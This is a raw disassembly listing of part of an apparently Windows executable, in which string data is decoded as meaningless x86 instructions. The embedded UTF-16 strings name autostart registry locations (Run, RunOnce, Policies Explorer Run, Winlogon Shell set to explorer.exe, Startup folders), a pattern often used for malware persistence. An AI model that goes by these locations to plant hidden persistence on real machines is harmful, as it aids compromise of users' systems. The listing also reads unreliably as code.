  40171f:	add    BYTE PTR [eax+eax*1+0x29],ch
  401723:	add    BYTE PTR [eax],al
  401725:	add    BYTE PTR [eax],al
  401727:	add    BYTE PTR [ebx+0x0],dl
  40172a:	outs   dx,DWORD PTR ds:[esi]
  40172b:	add    BYTE PTR [esi+0x0],ah
  40172e:	je     0x401730
  401730:	ja     0x401732
  401732:	popa   
  401733:	add    BYTE PTR [edx+0x0],dh
  401736:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40173b:	add    BYTE PTR [ecx+0x0],ch
  40173e:	arpl   WORD PTR [eax],ax
  401740:	jb     0x401742
  401742:	outs   dx,DWORD PTR ds:[esi]
  401743:	add    BYTE PTR [ebx+0x0],dh
  401746:	outs   dx,DWORD PTR ds:[esi]
  401747:	add    BYTE PTR [esi+0x0],ah
  40174a:	je     0x40174c
  40174c:	pop    esp
  40174d:	add    BYTE PTR [edi+0x0],dl
  401750:	imul   eax,DWORD PTR [eax],0x64006e
  401756:	outs   dx,DWORD PTR ds:[esi]
  401757:	add    BYTE PTR [edi+0x0],dh
  40175a:	jae    0x40175c
  40175c:	pop    esp
  40175d:	add    BYTE PTR [ebx+0x0],al
  401760:	jne    0x401762
  401762:	jb     0x401764
  401764:	jb     0x401766
  401766:	add    BYTE PTR gs:[esi+0x0],ch
  40176a:	je     0x40176c
  40176c:	push   esi
  40176d:	add    BYTE PTR [ebp+0x0],ah
  401770:	jb     0x401772
  401772:	jae    0x401774
  401774:	imul   eax,DWORD PTR [eax],0x6e006f
  40177a:	pop    esp
  40177b:	add    BYTE PTR [edx+0x0],dl
  40177e:	jne    0x401780
  401780:	outs   dx,BYTE PTR ds:[esi]
  401781:	add    BYTE PTR [edi+0x0],cl
  401784:	outs   dx,BYTE PTR ds:[esi]
  401785:	add    BYTE PTR [ebx+0x0],ah
  401788:	add    BYTE PTR gs:[ebp+0x0],al
  40178c:	js     0x40178e
  40178e:	add    BYTE PTR [eax],al
  401790:	jb     0x401792
  401792:	jne    0x401794
  401794:	outs   dx,BYTE PTR ds:[esi]
  401795:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401799:	add    BYTE PTR [eax+eax*1+0x33],ch
  40179d:	add    BYTE PTR [edx],dh
  40179f:	add    BYTE PTR [esi],ch
  4017a1:	add    BYTE PTR [ebp+0x0],ah
  4017a4:	js     0x4017a6
  4017a6:	add    BYTE PTR gs:[eax],al
  4017a9:	add    BYTE PTR [eax],al
  4017ab:	add    BYTE PTR [ecx+0x0],ch
  4017ae:	add    BYTE PTR gs:[edx+0x0],dh
  4017b2:	outs   dx,BYTE PTR ds:[esi]
  4017b3:	add    BYTE PTR [edi+0x0],ch
  4017b6:	outs   dx,BYTE PTR ds:[esi]
  4017b7:	add    BYTE PTR [ebx+0x0],ah
  4017ba:	add    BYTE PTR gs:[esi],ch
  4017bd:	add    BYTE PTR [eax+eax*1+0x6c],ah
  4017c1:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4017c5:	add    BYTE PTR [edx+0x0],dl
  4017c8:	jne    0x4017ca
  4017ca:	outs   dx,BYTE PTR ds:[esi]
  4017cb:	add    BYTE PTR [edi+0x0],cl
  4017ce:	outs   dx,BYTE PTR ds:[esi]
  4017cf:	add    BYTE PTR [ebx+0x0],ah
  4017d2:	add    BYTE PTR gs:[ebp+0x0],al
  4017d6:	js     0x4017d8
  4017d8:	push   eax
  4017d9:	add    BYTE PTR [edx+0x0],dh
  4017dc:	outs   dx,DWORD PTR ds:[esi]
  4017dd:	add    BYTE PTR [ebx+0x0],ah
  4017e0:	add    BYTE PTR gs:[ebx+0x0],dh
  4017e4:	jae    0x4017e6
  4017e6:	add    BYTE PTR [eax],al
  4017e8:	gs js  0x40185b
  4017eb:	ins    BYTE PTR es:[edi],dx
  4017ec:	outs   dx,DWORD PTR ds:[esi]
  4017ed:	jb     0x401854
  4017ef:	jb     0x40181f
  4017f1:	gs js  0x401859
  4017f4:	add    BYTE PTR [eax],al
  4017f6:	add    BYTE PTR [eax],al
  4017f8:	push   ebx
  4017f9:	add    BYTE PTR [edi+0x0],ch
  4017fc:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401801:	add    BYTE PTR [ecx+0x0],ah
  401804:	jb     0x401806
  401806:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40180b:	add    BYTE PTR [ecx+0x0],ch
  40180e:	arpl   WORD PTR [eax],ax
  401810:	jb     0x401812
  401812:	outs   dx,DWORD PTR ds:[esi]
  401813:	add    BYTE PTR [ebx+0x0],dh
  401816:	outs   dx,DWORD PTR ds:[esi]
  401817:	add    BYTE PTR [esi+0x0],ah
  40181a:	je     0x40181c
  40181c:	pop    esp
  40181d:	add    BYTE PTR [edi+0x0],dl
  401820:	imul   eax,DWORD PTR [eax],0x64006e
  401826:	outs   dx,DWORD PTR ds:[esi]
  401827:	add    BYTE PTR [edi+0x0],dh
  40182a:	jae    0x40182c
  40182c:	and    BYTE PTR [eax],al
  40182e:	dec    esi
  40182f:	add    BYTE PTR [eax+eax*1+0x5c],dl
  401833:	add    BYTE PTR [ebx+0x0],al
  401836:	jne    0x401838
  401838:	jb     0x40183a
  40183a:	jb     0x40183c
  40183c:	add    BYTE PTR gs:[esi+0x0],ch
  401840:	je     0x401842
  401842:	push   esi
  401843:	add    BYTE PTR [ebp+0x0],ah
  401846:	jb     0x401848
  401848:	jae    0x40184a
  40184a:	imul   eax,DWORD PTR [eax],0x6e006f
  401850:	pop    esp
  401851:	add    BYTE PTR [edi+0x0],dl
  401854:	imul   eax,DWORD PTR [eax],0x64006e
  40185a:	outs   dx,DWORD PTR ds:[esi]
  40185b:	add    BYTE PTR [edi+0x0],dh
  40185e:	jae    0x401860
  401860:	add    BYTE PTR [eax],al
  401862:	add    BYTE PTR [eax],al
  401864:	dec    esp
  401865:	add    BYTE PTR [edi+0x0],ch
  401868:	popa   
  401869:	add    BYTE PTR [eax+eax*1+0x0],ah
  40186d:	add    BYTE PTR [eax],al
  40186f:	add    BYTE PTR [ebx+0x0],dl
  401872:	outs   dx,DWORD PTR ds:[esi]
  401873:	add    BYTE PTR [esi+0x0],ah
  401876:	je     0x401878
  401878:	ja     0x40187a
  40187a:	popa   
  40187b:	add    BYTE PTR [edx+0x0],dh
  40187e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401883:	add    BYTE PTR [ecx+0x0],ch
  401886:	arpl   WORD PTR [eax],ax
  401888:	jb     0x40188a
  40188a:	outs   dx,DWORD PTR ds:[esi]
  40188b:	add    BYTE PTR [ebx+0x0],dh
  40188e:	outs   dx,DWORD PTR ds:[esi]
  40188f:	add    BYTE PTR [esi+0x0],ah
  401892:	je     0x401894
  401894:	pop    esp
  401895:	add    BYTE PTR [edi+0x0],dl
  401898:	imul   eax,DWORD PTR [eax],0x64006e
  40189e:	outs   dx,DWORD PTR ds:[esi]
  40189f:	add    BYTE PTR [edi+0x0],dh
  4018a2:	jae    0x4018a4
  4018a4:	and    BYTE PTR [eax],al
  4018a6:	dec    esi
  4018a7:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4018ab:	add    BYTE PTR [ebx+0x0],al
  4018ae:	jne    0x4018b0
  4018b0:	jb     0x4018b2
  4018b2:	jb     0x4018b4
  4018b4:	add    BYTE PTR gs:[esi+0x0],ch
  4018b8:	je     0x4018ba
  4018ba:	push   esi
  4018bb:	add    BYTE PTR [ebp+0x0],ah
  4018be:	jb     0x4018c0
  4018c0:	jae    0x4018c2
  4018c2:	imul   eax,DWORD PTR [eax],0x6e006f
  4018c8:	pop    esp
  4018c9:	add    BYTE PTR [edi+0x0],dl
  4018cc:	imul   eax,DWORD PTR [eax],0x64006e
  4018d2:	outs   dx,DWORD PTR ds:[esi]
  4018d3:	add    BYTE PTR [edi+0x0],dh
  4018d6:	jae    0x4018d8
  4018d8:	sub    al,0x0
  4018da:	dec    esp
  4018db:	add    BYTE PTR [edi+0x0],ch
  4018de:	popa   
  4018df:	add    BYTE PTR [eax+eax*1+0x0],ah
  4018e3:	add    BYTE PTR [edx+0x0],dl
  4018e6:	jne    0x4018e8
  4018e8:	outs   dx,BYTE PTR ds:[esi]
  4018e9:	add    BYTE PTR [eax],al
  4018eb:	add    BYTE PTR [eax],al
  4018ed:	add    BYTE PTR [eax],al
  4018ef:	add    BYTE PTR [ebx+0x0],dl
  4018f2:	outs   dx,DWORD PTR ds:[esi]
  4018f3:	add    BYTE PTR [esi+0x0],ah
  4018f6:	je     0x4018f8
  4018f8:	ja     0x4018fa
  4018fa:	popa   
  4018fb:	add    BYTE PTR [edx+0x0],dh
  4018fe:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401903:	add    BYTE PTR [ecx+0x0],ch
  401906:	arpl   WORD PTR [eax],ax
  401908:	jb     0x40190a
  40190a:	outs   dx,DWORD PTR ds:[esi]
  40190b:	add    BYTE PTR [ebx+0x0],dh
  40190e:	outs   dx,DWORD PTR ds:[esi]
  40190f:	add    BYTE PTR [esi+0x0],ah
  401912:	je     0x401914
  401914:	pop    esp
  401915:	add    BYTE PTR [edi+0x0],dl
  401918:	imul   eax,DWORD PTR [eax],0x64006e
  40191e:	outs   dx,DWORD PTR ds:[esi]
  40191f:	add    BYTE PTR [edi+0x0],dh
  401922:	jae    0x401924
  401924:	and    BYTE PTR [eax],al
  401926:	dec    esi
  401927:	add    BYTE PTR [eax+eax*1+0x5c],dl
  40192b:	add    BYTE PTR [ebx+0x0],al
  40192e:	jne    0x401930
  401930:	jb     0x401932
  401932:	jb     0x401934
  401934:	add    BYTE PTR gs:[esi+0x0],ch
  401938:	je     0x40193a
  40193a:	push   esi
  40193b:	add    BYTE PTR [ebp+0x0],ah
  40193e:	jb     0x401940
  401940:	jae    0x401942
  401942:	imul   eax,DWORD PTR [eax],0x6e006f
  401948:	pop    esp
  401949:	add    BYTE PTR [edi+0x0],dl
  40194c:	imul   eax,DWORD PTR [eax],0x64006e
  401952:	outs   dx,DWORD PTR ds:[esi]
  401953:	add    BYTE PTR [edi+0x0],dh
  401956:	jae    0x401958
  401958:	sub    al,0x0
  40195a:	push   edx
  40195b:	add    BYTE PTR [ebp+0x0],dh
  40195e:	outs   dx,BYTE PTR ds:[esi]
  40195f:	add    BYTE PTR [eax],al
  401961:	add    BYTE PTR [eax],al
  401963:	add    BYTE PTR [edi],bh
  401965:	add    BYTE PTR [eax],al
  401967:	add    BYTE PTR [edx+0x0],dl
  40196a:	jne    0x40196c
  40196c:	outs   dx,BYTE PTR ds:[esi]
  40196d:	add    BYTE PTR [ebx],dh
  40196f:	add    BYTE PTR [edx],dh
  401971:	add    BYTE PTR [eax],al
  401973:	add    BYTE PTR [eax],al
  401975:	add    BYTE PTR [eax],al
  401977:	add    BYTE PTR [ebx+0x0],dl
  40197a:	outs   dx,DWORD PTR ds:[esi]
  40197b:	add    BYTE PTR [esi+0x0],ah
  40197e:	je     0x401980
  401980:	ja     0x401982
  401982:	popa   
  401983:	add    BYTE PTR [edx+0x0],dh
  401986:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40198b:	add    BYTE PTR [ecx+0x0],ch
  40198e:	arpl   WORD PTR [eax],ax
  401990:	jb     0x401992
  401992:	outs   dx,DWORD PTR ds:[esi]
  401993:	add    BYTE PTR [ebx+0x0],dh
  401996:	outs   dx,DWORD PTR ds:[esi]
  401997:	add    BYTE PTR [esi+0x0],ah
  40199a:	je     0x40199c
  40199c:	pop    esp
  40199d:	add    BYTE PTR [edi+0x0],dl
  4019a0:	imul   eax,DWORD PTR [eax],0x64006e
  4019a6:	outs   dx,DWORD PTR ds:[esi]
  4019a7:	add    BYTE PTR [edi+0x0],dh
  4019aa:	jae    0x4019ac
  4019ac:	pop    esp
  4019ad:	add    BYTE PTR [ebx+0x0],al
  4019b0:	jne    0x4019b2
  4019b2:	jb     0x4019b4
  4019b4:	jb     0x4019b6
  4019b6:	add    BYTE PTR gs:[esi+0x0],ch
  4019ba:	je     0x4019bc
  4019bc:	push   esi
  4019bd:	add    BYTE PTR [ebp+0x0],ah
  4019c0:	jb     0x4019c2
  4019c2:	jae    0x4019c4
  4019c4:	imul   eax,DWORD PTR [eax],0x6e006f
  4019ca:	pop    esp
  4019cb:	add    BYTE PTR [edx+0x0],dl
  4019ce:	jne    0x4019d0
  4019d0:	outs   dx,BYTE PTR ds:[esi]
  4019d1:	add    BYTE PTR [eax],al
  4019d3:	add    BYTE PTR [eax],al
  4019d5:	add    BYTE PTR [eax],al
  4019d7:	add    BYTE PTR [ebx+0x0],dl
  4019da:	outs   dx,DWORD PTR ds:[esi]
  4019db:	add    BYTE PTR [esi+0x0],ah
  4019de:	je     0x4019e0
  4019e0:	ja     0x4019e2
  4019e2:	popa   
  4019e3:	add    BYTE PTR [edx+0x0],dh
  4019e6:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4019eb:	add    BYTE PTR [ecx+0x0],ch
  4019ee:	arpl   WORD PTR [eax],ax
  4019f0:	jb     0x4019f2
  4019f2:	outs   dx,DWORD PTR ds:[esi]
  4019f3:	add    BYTE PTR [ebx+0x0],dh
  4019f6:	outs   dx,DWORD PTR ds:[esi]
  4019f7:	add    BYTE PTR [esi+0x0],ah
  4019fa:	je     0x4019fc
  4019fc:	pop    esp
  4019fd:	add    BYTE PTR [edi+0x0],dl
  401a00:	imul   eax,DWORD PTR [eax],0x64006e
  401a06:	outs   dx,DWORD PTR ds:[esi]
  401a07:	add    BYTE PTR [edi+0x0],dh
  401a0a:	jae    0x401a0c
  401a0c:	pop    esp
  401a0d:	add    BYTE PTR [ebx+0x0],al
  401a10:	jne    0x401a12
  401a12:	jb     0x401a14
  401a14:	jb     0x401a16
  401a16:	add    BYTE PTR gs:[esi+0x0],ch
  401a1a:	je     0x401a1c
  401a1c:	push   esi
  401a1d:	add    BYTE PTR [ebp+0x0],ah
  401a20:	jb     0x401a22
  401a22:	jae    0x401a24
  401a24:	imul   eax,DWORD PTR [eax],0x6e006f
  401a2a:	pop    esp
  401a2b:	add    BYTE PTR [eax+0x0],dl
  401a2e:	outs   dx,DWORD PTR ds:[esi]
  401a2f:	add    BYTE PTR [eax+eax*1+0x69],ch
  401a33:	add    BYTE PTR [ebx+0x0],ah
  401a36:	imul   eax,DWORD PTR [eax],0x730065
  401a3c:	pop    esp
  401a3d:	add    BYTE PTR [ebp+0x0],al
  401a40:	js     0x401a42
  401a42:	jo     0x401a44
  401a44:	ins    BYTE PTR es:[edi],dx
  401a45:	add    BYTE PTR [edi+0x0],ch
  401a48:	jb     0x401a4a
  401a4a:	add    BYTE PTR gs:[edx+0x0],dh
  401a4e:	pop    esp
  401a4f:	add    BYTE PTR [edx+0x0],dl
  401a52:	jne    0x401a54
  401a54:	outs   dx,BYTE PTR ds:[esi]
  401a55:	add    BYTE PTR [eax],al
  401a57:	add    BYTE PTR [ecx+0x0],cl
  401a5a:	add    BYTE PTR [eax+0x1],al
  401a5d:	add    BYTE PTR [eax],al
  401a5f:	and    BYTE PTR [eax+0x14],0x40
  401a63:	add    BYTE PTR [ecx],cl
	...
  401a71:	add    BYTE PTR [eax],al
  401a73:	add    BYTE PTR [edx],al
  401a75:	add    BYTE PTR [eax],al
  401a77:	sbb    al,0x19
  401a7a:	inc    eax
  401a7b:	add    BYTE PTR [eax+0x0],cl
  401a7e:	add    BYTE PTR [eax],al
  401a80:	add    BYTE PTR [eax],al
  401a82:	add    BYTE PTR [eax],al
  401a84:	inc    esi
  401a85:	add    BYTE PTR [eax],al
  401a87:	inc    eax
  401a88:	add    al,BYTE PTR [eax]
  401a8a:	add    BYTE PTR [eax+0x401978],al
  401a90:	dec    eax
  401a91:	add    BYTE PTR [eax],al
  401a93:	add    ah,ah
  401a95:	sbb    BYTE PTR [eax+0x0],al
  401a98:	add    BYTE PTR [eax],al
  401a9a:	add    BYTE PTR [eax],al
  401a9c:	add    DWORD PTR [eax],eax
  401a9e:	add    BYTE PTR [eax+0x4019d8],al
  401aa4:	dec    eax
  401aa5:	add    BYTE PTR [eax],al
  401aa7:	add    BYTE PTR [eax],al
  401aa9:	add    BYTE PTR [eax],al
  401aab:	add    BYTE PTR [edi+0x0],al
  401aae:	add    BYTE PTR [eax+0x1],al
  401ab1:	add    BYTE PTR [eax],al
  401ab3:	cmp    BYTE PTR [eax+0x19],0x40
  401ab7:	add    BYTE PTR [eax+0x0],cl
  401aba:	add    BYTE PTR [eax],al
  401abc:	in     al,0x18
  401abe:	inc    eax
	...
  401ac7:	add    al,al
  401ac9:	add    BYTE PTR [eax],al
  401acb:	add    BYTE PTR [eax],al
  401acd:	add    BYTE PTR [eax],al
  401acf:	inc    esi
  401ad0:	push   edx
  401ad1:	add    BYTE PTR [ebp+0x0],dh
  401ad4:	outs   dx,BYTE PTR ds:[esi]
  401ad5:	add    BYTE PTR [ebx+0x0],dl
  401ad8:	je     0x401ada
  401ada:	jne    0x401adc
  401adc:	data16 add BYTE PTR [esi+0x0],ah
  401ae0:	dec    eax
  401ae1:	add    BYTE PTR [ecx+0x0],ah
  401ae4:	jae    0x401ae6
  401ae6:	inc    edx
  401ae7:	add    BYTE PTR [ebp+0x0],ah
  401aea:	add    BYTE PTR gs:[esi+0x0],ch
  401aee:	push   edx
  401aef:	add    BYTE PTR [ebp+0x0],dh
  401af2:	outs   dx,BYTE PTR ds:[esi]
  401af3:	add    BYTE PTR [eax],al
  401af5:	add    BYTE PTR [eax],al
  401af7:	add    BYTE PTR [esi],ch
  401af9:	add    BYTE PTR [ebp+0x0],ah
  401afc:	je     0x401afe
  401afe:	ins    BYTE PTR es:[edi],dx
  401aff:	add    BYTE PTR [eax],al
  401b01:	add    BYTE PTR [eax],al
  401b03:	add    BYTE PTR [ebp+0x0],al
  401b06:	js     0x401b08
  401b08:	jo     0x401b0a
  401b0a:	ins    BYTE PTR es:[edi],dx
  401b0b:	add    BYTE PTR [edi+0x0],ch
  401b0e:	jb     0x401b10
  401b10:	add    BYTE PTR gs:[edx+0x0],dh
  401b14:	push   ebx
  401b15:	add    BYTE PTR [eax+eax*1+0x61],dh
  401b19:	add    BYTE PTR [edx+0x0],dh
  401b1c:	je     0x401b1e
  401b1e:	jne    0x401b20
  401b20:	jo     0x401b22
  401b22:	dec    esp
  401b23:	add    BYTE PTR [edi+0x0],ch
  401b26:	add    BYTE PTR [bx+si],al
  401b29:	add    BYTE PTR [eax],al
  401b2b:	add    BYTE PTR [eax],al
  401b2d:	add    BYTE PTR [eax],al
  401b2f:	add    BYTE PTR ds:0x6f004c00,ah
  401b35:	add    BYTE PTR [ebx+0x0],ah
  401b38:	popa   
  401b39:	add    BYTE PTR [eax+eax*1+0x41],ch
  401b3d:	add    BYTE PTR [eax+0x0],dh
  401b40:	jo     0x401b42
  401b42:	inc    esp
  401b43:	add    BYTE PTR [ecx+0x0],ah
  401b46:	je     0x401b48
  401b48:	popa   
  401b49:	add    BYTE PTR ds:0x4d005c00,ah
  401b4f:	add    BYTE PTR [ecx+0x0],ch
  401b52:	arpl   WORD PTR [eax],ax
  401b54:	jb     0x401b56
  401b56:	outs   dx,DWORD PTR ds:[esi]
  401b57:	add    BYTE PTR [ebx+0x0],dh
  401b5a:	outs   dx,DWORD PTR ds:[esi]
  401b5b:	add    BYTE PTR [esi+0x0],ah
  401b5e:	je     0x401b60
  401b60:	pop    esp
  401b61:	add    BYTE PTR [edi+0x0],dl
  401b64:	imul   eax,DWORD PTR [eax],0x64006e
  401b6a:	outs   dx,DWORD PTR ds:[esi]
  401b6b:	add    BYTE PTR [edi+0x0],dh
  401b6e:	jae    0x401b70
  401b70:	pop    esp
  401b71:	add    BYTE PTR [ebp+0x0],al
  401b74:	js     0x401b76
  401b76:	jo     0x401b78
  401b78:	ins    BYTE PTR es:[edi],dx
  401b79:	add    BYTE PTR [edi+0x0],ch
  401b7c:	jb     0x401b7e
  401b7e:	add    BYTE PTR gs:[edx+0x0],dh
  401b82:	add    BYTE PTR [eax],al
  401b84:	add    al,0x1b
  401b86:	inc    eax
  401b87:	add    BYTE PTR [eax],dh
  401b89:	sbb    eax,DWORD PTR [eax+0x0]
  401b8c:	or     BYTE PTR [eax],al
  401b8e:	add    BYTE PTR [eax],al
  401b90:	add    DWORD PTR [eax],ecx
  401b92:	add    al,BYTE PTR [eax]
  401b94:	pusha  
  401b95:	jno    0x401bd7
  401b97:	add    BYTE PTR [ecx],al
  401b99:	add    BYTE PTR [eax],al
  401b9b:	add    ah,ah
  401b9d:	adc    al,0x2
  401b9f:	add    BYTE PTR [eax],al
  401ba1:	add    BYTE PTR [eax],al
  401ba3:	add    al,al
  401ba5:	add    BYTE PTR [eax],al
  401ba7:	add    BYTE PTR [eax],al
  401ba9:	add    BYTE PTR [eax],al
  401bab:	inc    esi
  401bac:	fcomp  QWORD PTR [ebx]
  401bae:	inc    eax
  401baf:	add    BYTE PTR [eax],al
  401bb1:	add    BYTE PTR [eax],al
  401bb3:	add    ah,ch
  401bb5:	sbb    eax,DWORD PTR [eax+0x0]
  401bb8:	add    al,0x0
  401bba:	add    BYTE PTR [eax],al
  401bbc:	int3   
  401bbd:	sbb    eax,DWORD PTR [eax+0x0]
  401bc0:	or     BYTE PTR [eax],al
	...
  401bca:	add    BYTE PTR [eax],al
  401bcc:	mov    ds:0xa9fc4801,eax
  401bd1:	sub    ecx,edi
  401bd3:	adc    DWORD PTR [edx+0xaa0029],esp
  401bd9:	cmp    eax,0x40c15273
  401bde:	push   ecx
  401bdf:	ins    DWORD PTR es:[edi],dx
  401be0:	ss je  0x401bb1
  401be3:	adc    DWORD PTR [eax+0xaa0034],eax
  401be9:	pusha  
  401bea:	or     edx,edi
  401bec:	stos   BYTE PTR es:[edi],al
  401bed:	aaa    
  401bee:	mov    ecx,0x983110c2
  401bf3:	inc    ebx
  401bf4:	mov    dl,BYTE PTR [esi-0xd]
  401bf7:	dec    esp
  401bf8:	arpl   WORD PTR [edx-0x2e],ax
  401bfb:	inc    esp
  401bfc:	add    BYTE PTR [eax],al
  401bfe:	add    BYTE PTR [eax],al
  401c00:	push   ebx
  401c01:	add    BYTE PTR [edi+0x0],ch
  401c04:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401c09:	add    BYTE PTR [ecx+0x0],ah
  401c0c:	jb     0x401c0e
  401c0e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401c13:	add    BYTE PTR [ecx+0x0],ch
  401c16:	arpl   WORD PTR [eax],ax
  401c18:	jb     0x401c1a
  401c1a:	outs   dx,DWORD PTR ds:[esi]
  401c1b:	add    BYTE PTR [ebx+0x0],dh
  401c1e:	outs   dx,DWORD PTR ds:[esi]
  401c1f:	add    BYTE PTR [esi+0x0],ah
  401c22:	je     0x401c24
  401c24:	pop    esp
  401c25:	add    BYTE PTR [edi+0x0],dl
  401c28:	imul   eax,DWORD PTR [eax],0x64006e
  401c2e:	outs   dx,DWORD PTR ds:[esi]
  401c2f:	add    BYTE PTR [edi+0x0],dh
  401c32:	jae    0x401c34
  401c34:	pop    esp
  401c35:	add    BYTE PTR [ebx+0x0],al
  401c38:	jne    0x401c3a
  401c3a:	jb     0x401c3c
  401c3c:	jb     0x401c3e
  401c3e:	add    BYTE PTR gs:[esi+0x0],ch
  401c42:	je     0x401c44
  401c44:	push   esi
  401c45:	add    BYTE PTR [ebp+0x0],ah
  401c48:	jb     0x401c4a
  401c4a:	jae    0x401c4c
  401c4c:	imul   eax,DWORD PTR [eax],0x6e006f
  401c52:	pop    esp
  401c53:	add    BYTE PTR [ebp+0x0],al
  401c56:	js     0x401c58
  401c58:	jo     0x401c5a
  401c5a:	ins    BYTE PTR es:[edi],dx
  401c5b:	add    BYTE PTR [edi+0x0],ch
  401c5e:	jb     0x401c60
  401c60:	add    BYTE PTR gs:[edx+0x0],dh
  401c64:	pop    esp
  401c65:	add    BYTE PTR [ebx+0x0],dl
  401c68:	je     0x401c6a
  401c6a:	popa   
  401c6b:	add    BYTE PTR [edx+0x0],dh
  401c6e:	je     0x401c70
  401c70:	jne    0x401c72
  401c72:	jo     0x401c74
  401c74:	inc    ecx
  401c75:	add    BYTE PTR [eax+0x0],dh
  401c78:	jo     0x401c7a
  401c7a:	jb     0x401c7c
  401c7c:	outs   dx,DWORD PTR ds:[esi]
  401c7d:	add    BYTE PTR [esi+0x0],dh
  401c80:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  401c85:	add    BYTE PTR [eax],al
  401c87:	add    BYTE PTR [ebx+0x0],dl
  401c8a:	outs   dx,DWORD PTR ds:[esi]
  401c8b:	add    BYTE PTR [esi+0x0],ah
  401c8e:	je     0x401c90
  401c90:	ja     0x401c92
  401c92:	popa   
  401c93:	add    BYTE PTR [edx+0x0],dh
  401c96:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401c9b:	add    BYTE PTR [ecx+0x0],ch
  401c9e:	arpl   WORD PTR [eax],ax
  401ca0:	jb     0x401ca2
  401ca2:	outs   dx,DWORD PTR ds:[esi]
  401ca3:	add    BYTE PTR [ebx+0x0],dh
  401ca6:	outs   dx,DWORD PTR ds:[esi]
  401ca7:	add    BYTE PTR [esi+0x0],ah
  401caa:	je     0x401cac
  401cac:	pop    esp
  401cad:	add    BYTE PTR [edi+0x0],dl
  401cb0:	imul   eax,DWORD PTR [eax],0x64006e
  401cb6:	outs   dx,DWORD PTR ds:[esi]
  401cb7:	add    BYTE PTR [edi+0x0],dh
  401cba:	jae    0x401cbc
  401cbc:	pop    esp
  401cbd:	add    BYTE PTR [ebx+0x0],al
  401cc0:	jne    0x401cc2
  401cc2:	jb     0x401cc4
  401cc4:	jb     0x401cc6
  401cc6:	add    BYTE PTR gs:[esi+0x0],ch
  401cca:	je     0x401ccc
  401ccc:	push   esi
  401ccd:	add    BYTE PTR [ebp+0x0],ah
  401cd0:	jb     0x401cd2
  401cd2:	jae    0x401cd4
  401cd4:	imul   eax,DWORD PTR [eax],0x6e006f
  401cda:	pop    esp
  401cdb:	add    BYTE PTR [ebp+0x0],al
  401cde:	js     0x401ce0
  401ce0:	jo     0x401ce2
  401ce2:	ins    BYTE PTR es:[edi],dx
  401ce3:	add    BYTE PTR [edi+0x0],ch
  401ce6:	jb     0x401ce8
  401ce8:	add    BYTE PTR gs:[edx+0x0],dh
  401cec:	pop    esp
  401ced:	add    BYTE PTR [ebx+0x0],dl
  401cf0:	add    BYTE PTR gs:[edx+0x0],dh
  401cf4:	imul   eax,DWORD PTR [eax],0x6c0061
  401cfa:	imul   eax,DWORD PTR [eax],0x65007a
  401d00:	add    BYTE PTR [eax],al
  401d02:	add    BYTE PTR [eax],al
  401d04:	push   eax
  401d05:	add    BYTE PTR [edx+0x0],dh
  401d08:	outs   dx,DWORD PTR ds:[esi]
  401d09:	add    BYTE PTR [ebx+0x0],ah
  401d0c:	add    BYTE PTR gs:[ebx+0x0],dh
  401d10:	jae    0x401d12
  401d12:	inc    ebx
  401d13:	add    BYTE PTR [eax+0x0],dl
  401d16:	push   ebp
  401d17:	add    BYTE PTR [eax+0x0],dl
  401d1a:	add    BYTE PTR gs:[edx+0x0],dh
  401d1e:	arpl   WORD PTR [eax],ax
  401d20:	add    BYTE PTR gs:[esi+0x0],ch
  401d24:	je     0x401d26
  401d26:	dec    ebp
  401d27:	add    BYTE PTR [ecx+0x0],ah
  401d2a:	js     0x401d2c
  401d2c:	add    BYTE PTR [eax],al
  401d2e:	add    BYTE PTR [eax],al
  401d30:	push   eax
  401d31:	add    BYTE PTR [edx+0x0],dh
  401d34:	outs   dx,DWORD PTR ds:[esi]
  401d35:	add    BYTE PTR [ebx+0x0],ah
  401d38:	add    BYTE PTR gs:[ebx+0x0],dh
  401d3c:	jae    0x401d3e
  401d3e:	dec    eax
  401d3f:	add    BYTE PTR [ecx+0x0],ah
  401d42:	jb     0x401d44
  401d44:	add    BYTE PTR fs:[esi+0x0],al
  401d48:	popa   
  401d49:	add    BYTE PTR [ebp+0x0],dh
  401d4c:	ins    BYTE PTR es:[edi],dx
  401d4d:	add    BYTE PTR [eax+eax*1+0x73],dh
  401d51:	add    BYTE PTR [ebp+0x0],cl
  401d54:	popa   
  401d55:	add    BYTE PTR [eax+0x0],bh
  401d58:	add    BYTE PTR [eax],al
  401d5a:	add    BYTE PTR [eax],al
  401d5c:	push   ebx
  401d5d:	add    BYTE PTR [eax+eax*1+0x65],dh
  401d61:	add    BYTE PTR [ecx+0x0],ah
  401d64:	add    BYTE PTR fs:[ecx+0x0],bh
  401d68:	push   esp
  401d69:	add    BYTE PTR [ecx+0x0],ch
  401d6c:	ins    DWORD PTR es:[edi],dx
  401d6d:	add    BYTE PTR [ebp+0x0],ah
  401d70:	dec    esi
  401d71:	add    BYTE PTR [ebp+0x0],ah
  401d74:	add    BYTE PTR gs:[eax+eax*1+0x65],ah
  401d79:	add    BYTE PTR [eax+eax*1+0x49],ah
  401d7d:	add    BYTE PTR [esi+0x0],ch
  401d80:	dec    ebp
  401d81:	add    BYTE PTR [ebx+0x0],dl
  401d84:	add    BYTE PTR gs:[ebx+0x0],ah
  401d88:	add    BYTE PTR [eax],al
  401d8a:	add    BYTE PTR [eax],al
  401d8c:	push   eax
  401d8d:	add    BYTE PTR [edx+0x0],dh
  401d90:	outs   dx,DWORD PTR ds:[esi]
  401d91:	add    BYTE PTR [ebx+0x0],ah
  401d94:	add    BYTE PTR gs:[ebx+0x0],dh
  401d98:	jae    0x401d9a
  401d9a:	push   edi
  401d9b:	add    BYTE PTR [ecx+0x0],ah
  401d9e:	imul   eax,DWORD PTR [eax],0x540074
  401da4:	imul   eax,DWORD PTR [eax],0x65006d
  401daa:	outs   dx,DWORD PTR ds:[esi]
  401dab:	add    BYTE PTR [ebp+0x0],dh
  401dae:	je     0x401db0
  401db0:	dec    ecx
